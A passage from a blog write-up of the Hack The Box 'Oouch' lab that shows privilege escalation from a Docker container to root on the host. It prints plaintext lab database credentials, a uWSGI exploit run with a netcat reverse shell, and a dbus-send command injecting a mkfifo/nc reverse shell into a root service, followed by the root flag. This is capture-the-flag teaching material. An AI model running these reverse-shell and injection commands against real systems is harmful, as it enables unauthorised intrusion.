</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="c">&lt;!-- -*- XML -*- --&gt;</span>

<span class="cp">&lt;!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd"&gt;</span>

<span class="nt">&lt;busconfig&gt;</span>

    <span class="nt">&lt;policy</span> <span class="na">user=</span><span class="s">"root"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;allow</span> <span class="na">own=</span><span class="s">"htb.oouch.Block"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/policy&gt;</span>

        <span class="nt">&lt;policy</span> <span class="na">user=</span><span class="s">"www-data"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">"htb.oouch.Block"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;allow</span> <span class="na">receive_sender=</span><span class="s">"htb.oouch.Block"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/policy&gt;</span>

<span class="nt">&lt;/busconfig&gt;</span>
</pre></table></code></div></div><p>So the user <code class="language-plaintext highlighter-rouge">www-data</code> can send and receive on dbus using <code class="language-plaintext highlighter-rouge">htb.oouch.Block</code>, but I wasn’t sure how to use this right then.</p><p>In the output from the command <code class="language-plaintext highlighter-rouge">ip a</code> I noticed that there were Docker containers running in the <code class="language-plaintext highlighter-rouge">172.17.0.1/16</code> range. I wondered if <code class="language-plaintext highlighter-rouge">qtc</code> was able to connect to one.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default
    <span class="nb">link</span>/ether 02:42:f9:aa:6c:dd brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
    <span class="nb">link</span>/ether 02:42:61:5e:2b:bf brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:61ff:fe5e:2bbf/64 scope <span class="nb">link
       </span>valid_lft forever preferred_lft forever
</pre></table></code></div></div><p>The answer was yes! It took a few tries to find an IP I could connect to (<code class="language-plaintext highlighter-rouge">172.18.0.5</code>), though.</p><blockquote><p>Side note: After going back in to validate my notes, I noticed that the final octet of the container IP seems to be randomized. It was <strong><code class="language-plaintext highlighter-rouge">172.178.0.4</code></strong> the next time I did it.</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre>qtc@oouch:~/.ssh<span class="nv">$ </span>ssh qtc@172.18.0.5 <span class="nt">-i</span> id_rsa 
The authenticity of host <span class="s1">'172.18.0.5 (172.18.0.5)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '</span>172.18.0.5<span class="s1">' (ED25519) to the list of known hosts.
Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
qtc@aeb4525789d8:~$ cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDaiHaXNdUzLxnlmEI1y+DWRQjEELNA+GcK1vEQXmAFYm9f6GubbWvdkt6QkgvWTvh7FnLM5U4sdfKPFv6mNZZwHZ9nNxB4gR+5B5EGOIzX+D+uDmdbe3r+ME8E68t1aUcwLEba6xF+PErQuiEBCdgcH405dYMClu/apccO+ougD+QpWOFhHNE9VOWHZD3++oRNJFS/Zgh8IZOLU0PnnenLC8ZK3CritRchzG0QHKxgV/6tMPmmzIKk0Ak7iixaK8hzrtKfPNCI3QPe8kXG1KYnMoo8mZ6c3CDUWevldAK+m1i7rluORNRwn6r4KAGwdP2qUdtMR2uo7COl2t5uGtuYtBRrhAZe/S637f/VMrrPq8+2B7db+ne1qn4WyD/sPxf4rfZDwlvXJ6ctfKMYUrV69eMtIKaiU3FYGqXTfAaObmFrO0++TvB/ZcH4h21edVPCn2HJ4pHUFZaYDEUKd2Ho61N0cgGUYWWc+mcCoCxyLLSaOJAv2vtjErV9YkyLGWM= pentester@kali

qtc@aeb4525789d8:/$ ls 
bin   code  etc   lib    media  opt   root  sbin  sys  usr
boot  dev   home  lib64  mnt    proc  run   srv   tmp  var
qtc@aeb4525789d8:/$ ls -la
total 84
drwxr-xr-x   1 root root 4096 Feb 25 12:33 .
drwxr-xr-x   1 root root 4096 Feb 25 12:33 ..
-rwxr-xr-x   1 root root    0 Feb 25 12:33 .dockerenv
drwxr-xr-x   1 root root 4096 Feb 11 17:37 bin
drwxr-xr-x   2 root root 4096 Nov 10  2019 boot
drwxr-xr-x   4 root root 4096 Feb 11 17:34 code
drwxr-xr-x   5 root root  340 Jun 11 04:35 dev
drwxr-xr-x   1 root root 4096 Feb 25 12:33 etc
drwxr-xr-x   1 root root 4096 Feb 11 17:37 home
drwxr-xr-x   1 root root 4096 Feb 11 17:37 lib
drwxr-xr-x   2 root root 4096 Jan 30 00:00 lib64
drwxr-xr-x   2 root root 4096 Jan 30 00:00 media
drwxr-xr-x   2 root root 4096 Jan 30 00:00 mnt
drwxr-xr-x   2 root root 4096 Jan 30 00:00 opt
dr-xr-xr-x 215 root root    0 Jun 11 04:35 proc
drwx------   1 root root 4096 Feb 11 17:38 root
drwxr-xr-x   1 root root 4096 Jun 11 10:23 run
drwxr-xr-x   1 root root 4096 Feb 11 17:37 sbin
drwxr-xr-x   2 root root 4096 Jan 30 00:00 srv
dr-xr-xr-x  13 root root    0 Jun 11 04:35 sys
drwxrwxrwt   1 root root 4096 Jun 11 04:35 tmp
drwxr-xr-x   1 root root 4096 Jan 30 00:00 usr
drwxr-xr-x   1 root root 4096 Feb 11 17:36 var
</span></pre></table></code></div></div><p>After connecting through SSH with the same OpenSSH key for user <code class="language-plaintext highlighter-rouge">qtc</code>, I began enumerating the docker container. The <code class="language-plaintext highlighter-rouge">/code</code> folder in the root looked interesting…</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/$ cd code
qtc@aeb4525789d8:/code$ ls -la
total 52
drwxr-xr-x 4 root root 4096 Feb 11 17:34 .
drwxr-xr-x 1 root root 4096 Feb 25 12:33 ..
-rw-r--r-- 1 root root 1072 Feb 11 17:34 Dockerfile
-r-------- 1 root root  568 Feb 11 17:34 authorized_keys
-rw-r--r-- 1 root root  325 Feb 11 17:34 config.py
-rw-r--r-- 1 root root   23 Feb 11 17:34 consumer.py
-r-------- 1 root root 2602 Feb 11 17:34 key
drwxr-xr-x 4 root root 4096 Feb 11 17:34 migrations
-rw-r--r-- 1 root root  724 Feb 11 17:34 nginx.conf
drwxr-xr-x 5 root root 4096 Feb 11 17:34 oouch
-rw-r--r-- 1 root root  241 Feb 11 17:34 requirements.txt
-rwxr-xr-x 1 root root   89 Feb 11 17:34 start.sh
-rw-rw-rw- 1 root root    0 Jun 11 10:36 urls.txt
-rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini
</pre></table></code></div></div><p>There were lots of interesting looking files in this directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/code<span class="nv">$ </span><span class="nb">cat </span>requirements.txt 
<span class="nv">Flask</span><span class="o">==</span>1.0.2
Flask-Bootstrap<span class="o">==</span>3.3.7.1
Flask-Login<span class="o">==</span>0.4.1
Flask-Migrate<span class="o">==</span>2.5.2
Flask-SQLAlchemy<span class="o">==</span>2.4.0
Flask-WTF<span class="o">==</span>0.14.2
<span class="nv">uWSGI</span><span class="o">==</span>2.0.17.1
<span class="nv">Werkzeug</span><span class="o">==</span>0.14.1
<span class="nv">requests</span><span class="o">==</span>2.20.1
<span class="nv">geojson</span><span class="o">==</span>2.5.0
<span class="nv">jsonschema</span><span class="o">==</span>2.6.0
<span class="nv">simplejson</span><span class="o">==</span>3.16.0
<span class="nv">mysqlclient</span><span class="o">==</span>1.4.4
</pre></table></code></div></div><p>The file <code class="language-plaintext highlighter-rouge">requirements.txt</code> gave a listing of the dependencies and versions of the software needed to run the websites, so perhaps there was something I could use to find an exploit.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">qtc</span><span class="o">@</span><span class="n">aeb4525789d8</span><span class="p">:</span><span class="o">/</span><span class="n">code</span><span class="err">$</span> <span class="n">cat</span> <span class="n">config</span><span class="p">.</span><span class="n">py</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">basedir</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>

<span class="k">class</span> <span class="nc">Config</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="c1"># ...
</span>    <span class="n">SQLALCHEMY_DATABASE_URI</span> <span class="o">=</span> <span class="s">'mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer'</span>
    <span class="n">SQLALCHEMY_TRACK_MODIFICATIONS</span> <span class="o">=</span> <span class="bp">False</span>

    <span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'SECRET_KEY'</span><span class="p">)</span> <span class="ow">or</span> <span class="s">'klarabubuklarabubuklarabubuklarabubu'</span>
</pre></table></code></div></div><p>The MySQL creds in <code class="language-plaintext highlighter-rouge">config.py</code> file looked interesting…though I’m not sure if it was another route to root or a rabbit hole. I forgot about it until after I had gotten root and never used them.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/code<span class="nv">$ </span><span class="nb">cat </span>uwsgi.ini 
<span class="o">[</span>uwsgi]
module <span class="o">=</span> oouch:app
uid <span class="o">=</span> www-data
gid <span class="o">=</span> www-data
master <span class="o">=</span> <span class="nb">true
</span>processes <span class="o">=</span> 10
socket <span class="o">=</span> /tmp/uwsgi.socket
chmod-sock <span class="o">=</span> 777
vacuum <span class="o">=</span> <span class="nb">true
</span>die-on-term <span class="o">=</span> <span class="nb">true</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">uwsgi</code> service was running on the <code class="language-plaintext highlighter-rouge">oouch</code>box, and I also found the <code class="language-plaintext highlighter-rouge">wsgi.ini</code> file in the Docker container. Apparently it runs in the context of the <code class="language-plaintext highlighter-rouge">www-data</code> user, which we saw earlier in the <code class="language-plaintext highlighter-rouge">htb.oouch.Block.conf</code>. I checked to see if there were any exploits for this service and found: <a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</a></p><p>I then tried to run the exploit to try to get a reverse shell:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/oouch<span class="nv">$ </span>python3 ./uwsgi.py http://10.10.10.177:5000 <span class="nt">-c</span> <span class="s2">" nc -e /bin/sh 10.0.0.1 1234"</span>
usage: uwsgi.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-m</span> <span class="o">[{</span>http,tcp,unix<span class="o">}]]</span> <span class="nt">-u</span> <span class="o">[</span>UWSGI_ADDR] <span class="nt">-c</span> <span class="o">[</span>COMMAND]
uwsgi.py: error: the following arguments are required: <span class="nt">-u</span>/--uwsgi
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">uwsgi</code> service runs from the docker container so I couldn’t figure out how to get this exploit to connect to my Kali machine easily. I used SCP to copy the exploit into the container (along with a version of nc since it wasn’t installed.)</p><blockquote><p>Note: make sure to put the <code class="language-plaintext highlighter-rouge">:</code> after the IP and before the folder name; it won’t work otherwise.</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>qtc@oouch:/dev/shm<span class="nv">$ </span>scp <span class="nt">-i</span> /home/qtc/.ssh/id_rsa ./uwsgi.py qtc@172.18.0.5:/tmp/
uwsgi.py                                                             100% 4428     8.3MB/s   00:00
qtc@oouch:/dev/shm<span class="nv">$ </span>scp <span class="nt">-i</span> /home/qtc/.ssh/id_rsa /bin/nc qtc@172.18.0.5:/tmp/
nc                                                                   100%   27KB  24.7MB/s   00:00
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">uwsgi.socket</code> was in <code class="language-plaintext highlighter-rouge">/tmp</code> so I had my <code class="language-plaintext highlighter-rouge">--uwsgi</code> argument taken care of, but then encountered an error while running the exploit:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/tmp<span class="nv">$ </span>python ./uwsgi.py <span class="nt">-m</span> unix <span class="nt">-u</span> uwsgi.socket <span class="nt">-c</span> <span class="s2">"nc -e /bin/sh 10.0.0.1 1234"</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span>Sending payload.
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"./uwsgi.py"</span>, line 146, <span class="k">in</span> &lt;module&gt;
    main<span class="o">()</span>
  File <span class="s2">"./uwsgi.py"</span>, line 143, <span class="k">in </span>main
    print<span class="o">(</span>curl<span class="o">(</span>args.mode.lower<span class="o">()</span>, args.uwsgi_addr, payload, <span class="s1">'/testapp'</span><span class="o">))</span>
  File <span class="s2">"./uwsgi.py"</span>, line 110, <span class="k">in </span>curl
    <span class="k">return </span>ask_uwsgi<span class="o">(</span>addr_and_port, mode, var<span class="o">)</span>
  File <span class="s2">"./uwsgi.py"</span>, line 77, <span class="k">in </span>ask_uwsgi
    s.send<span class="o">(</span>pack_uwsgi_vars<span class="o">(</span>var<span class="o">)</span> + body.encode<span class="o">(</span><span class="s1">'utf8'</span><span class="o">))</span>
  File <span class="s2">"./uwsgi.py"</span>, line 26, <span class="k">in </span>pack_uwsgi_vars
    pk +<span class="o">=</span> sz<span class="o">(</span>k<span class="o">)</span> + k.encode<span class="o">(</span><span class="s1">'utf8'</span><span class="o">)</span> + sz<span class="o">(</span>v<span class="o">)</span> + v.encode<span class="o">(</span><span class="s1">'utf8'</span><span class="o">)</span>
  File <span class="s2">"./uwsgi.py"</span>, line 18, <span class="k">in </span>sz
    <span class="k">if </span>sys.version_info[0] <span class="o">==</span> 3: import bytes
ModuleNotFoundError: No module named <span class="s1">'bytes'</span>
</pre></table></code></div></div><p>Fortunately commenting out the lines that referenced the <code class="language-plaintext highlighter-rouge">bytes</code> module solved the problem and the code ran. I still wasn’t able to get a shell back to my box from the docker container, so tried sending it to the <code class="language-plaintext highlighter-rouge">oouch</code> box instead.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/tmp<span class="nv">$ </span>python ./uwsgi.py <span class="nt">-m</span> unix <span class="nt">-u</span> uwsgi.socket <span class="nt">-c</span> <span class="s2">"/tmp/nc -e /bin/sh 172.18.0.1 1234"</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span>Sending payload.
</pre></table></code></div></div><p>…it worked, and, I got a connection on my netcat listener I set up back on <code class="language-plaintext highlighter-rouge">qtc@oouch</code>.</p><blockquote><p><em>If you are wondering how I was able to do this, I had another terminal open and set up another SSH connection to the</em> <strong><code class="language-plaintext highlighter-rouge">oouch</code></strong> <em>machine from my localhost. If you didn’t know, you can login to the same machine multiple times with SSH (not sure what the technical limit may be).</em></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>172.18.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.18.0.5] 53934
<span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span>www-data
aeb4525789d8
</pre></table></code></div></div><p>Now that I was logged in as <code class="language-plaintext highlighter-rouge">www-data</code>, I needed to see if that dbus configuration file I found earlier could come in handy. It mentioned interacting with dbus and the <code class="language-plaintext highlighter-rouge">htb.oouch.block</code> app. The code below was from <code class="language-plaintext highlighter-rouge">routes.py</code> found in the <code class="language-plaintext highlighter-rouge">/code/oouch</code> directory of the docker container and showed the information needed to craft my message to DBus. <em>(I also think this was the filter that was blocking my early XSS attempts on the <code class="language-plaintext highlighter-rouge">/contact</code> page).</em></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c1"># First apply our primitive xss filter
</span>        <span class="k">if</span> <span class="n">primitive_xss</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="n">textfield</span><span class="p">.</span><span class="n">data</span><span class="p">):</span>
            <span class="n">bus</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="n">SystemBus</span><span class="p">()</span>
            <span class="n">block_object</span> <span class="o">=</span> <span class="n">bus</span><span class="p">.</span><span class="n">get_object</span><span class="p">(</span><span class="s">'htb.oouch.Block'</span><span class="p">,</span> <span class="s">'/htb/oouch/Block'</span><span class="p">)</span>
            <span class="n">block_iface</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="n">Interface</span><span class="p">(</span><span class="n">block_object</span><span class="p">,</span> <span class="n">dbus_interface</span><span class="o">=</span><span class="s">'htb.oouch.Block'</span><span class="p">)</span>

            <span class="n">client_ip</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'REMOTE_ADDR'</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span><span class="p">)</span>  
            <span class="n">response</span> <span class="o">=</span> <span class="n">block_iface</span><span class="p">.</span><span class="n">Block</span><span class="p">(</span><span class="n">client_ip</span><span class="p">)</span>
            <span class="n">bus</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'hacker.html'</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s">'Hacker'</span><span class="p">)</span>
</pre></table></code></div></div><p>I found some examples of how to craft the exploit message on GitHub at <a href="https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b">https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b</a>. There was also a related POC that exploits a kernel module (which I didn’t do for this challenge) at <a href="https://www.exploit-db.com/exploits/36820">https://www.exploit-db.com/exploits/36820</a>.</p><p>The example exploit command and reply were as follows:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>dbus-send <span class="nt">--print-reply</span> <span class="nt">--system</span> <span class="nt">--dest</span><span class="o">=</span>com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,<span class="s2">"foo"</span>,XAUTHORITY,<span class="s2">"foo"</span>,LD_PRELOAD,<span class="s2">"/tmp/test.so"</span>

method <span class="k">return </span><span class="nv">sender</span><span class="o">=</span>:1.4364 -&gt; <span class="nv">dest</span><span class="o">=</span>:1.7427 <span class="nv">reply_serial</span><span class="o">=</span>2
</pre></table></code></div></div><p>My test code and the services reply:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>dbus-send <span class="nt">--print-reply</span> <span class="nt">--system</span> <span class="nt">--dest</span><span class="o">=</span>htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:<span class="s2">"echo whoami;"</span>

method <span class="k">return </span><span class="nb">time</span><span class="o">=</span>1591881935.932055 <span class="nv">sender</span><span class="o">=</span>:1.2 -&gt; <span class="nv">destination</span><span class="o">=</span>:1.1283 <span class="nv">serial</span><span class="o">=</span>7 <span class="nv">reply_serial</span><span class="o">=</span>2
   string <span class="s2">"Carried out :D"</span>
</pre></table></code></div></div><p>The reply <code class="language-plaintext highlighter-rouge">string "Carried out :D"</code> made it look like I was on the right track, even though I didn’t see any echo. I figured that the standard-out was not being sent back to my terminal and that was why I wasn’t able to see my test work.</p><p>I then tried substituting the <code class="language-plaintext highlighter-rouge">echo whoami</code> command for a reverse shell:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dbus-send <span class="nt">--print-reply</span> <span class="nt">--system</span> <span class="nt">--dest</span><span class="o">=</span>htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:<span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.253 1234 &gt;/tmp/f"</span>
</pre></table></code></div></div><p>I still couldn’t reach my home box from the container…but I thought that maybe I could send this shell to <code class="language-plaintext highlighter-rouge">qtc@oouch</code> again.</p><blockquote><p>Note: It also needed <code class="language-plaintext highlighter-rouge">;</code> on the end of the string for some reason!! This certainly took a little while to troubleshoot and discover.</p></blockquote><h3 id="getting-a-root-shell">Getting a root shell</h3><p>My final working exploit:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 172.18.0.1 1234 &gt;/tmp/f;"

method return time=1591882762.569865 sender=:1.2 -&gt; destination=:1.1325 serial=15 reply_serial=2
   string "Carried out :D"
</pre></table></code></div></div><p>I’m in! The service spawned a reverse shell connection back to my waiting netcat listener on the <code class="language-plaintext highlighter-rouge">oouch</code> machine.</p><blockquote><p>Looking back, I probably could have used an SSH tunnel to connect through from my local host, but I didn’t know how to do that back when I first rooted this machine.</p></blockquote><h3 id="roottxt">Root.txt</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>qtc@oouch:/etc/dbus-1/system.d<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>172.18.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.177] 50776
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# whoami &amp;&amp; hostname
root
oouch
# cat root.txt
d63a830d3105bfeb7bb05f994080f187
</span></pre></table></code></div></div><p>Thanks to <a href="https://www.hackthebox.eu/home/users/profile/103578"><code class="language-plaintext highlighter-rouge">qtc</code></a> for a very fun and very challenging box!</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/containers/" class="post-tag no-text-decoration" >containers</a> <a href="/tags/dbus/" class="post-tag no-text-decoration" >dbus</a> <a href="/tags/uwsgi/" class="post-tag no-text-decoration" >uwsgi</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/burp/" class="post-tag no-text-decoration" >burp</a> <a href="/tags/oauth/" class="post-tag no-text-decoration" >oauth</a> <a href="/tags/django/" class="post-tag no-text-decoration" >django</a> <a href="/tags/flask/" class="post-tag no-text-decoration" >flask</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >ssrf</a> <a href="/tags/hard/" class="post-tag no-text-decoration" >hard</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/qtc/" class="post-tag no-text-decoration" >qtc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Oouch Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/oouch/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Oouch Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/oouch/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - Oouch Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/oouch/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a 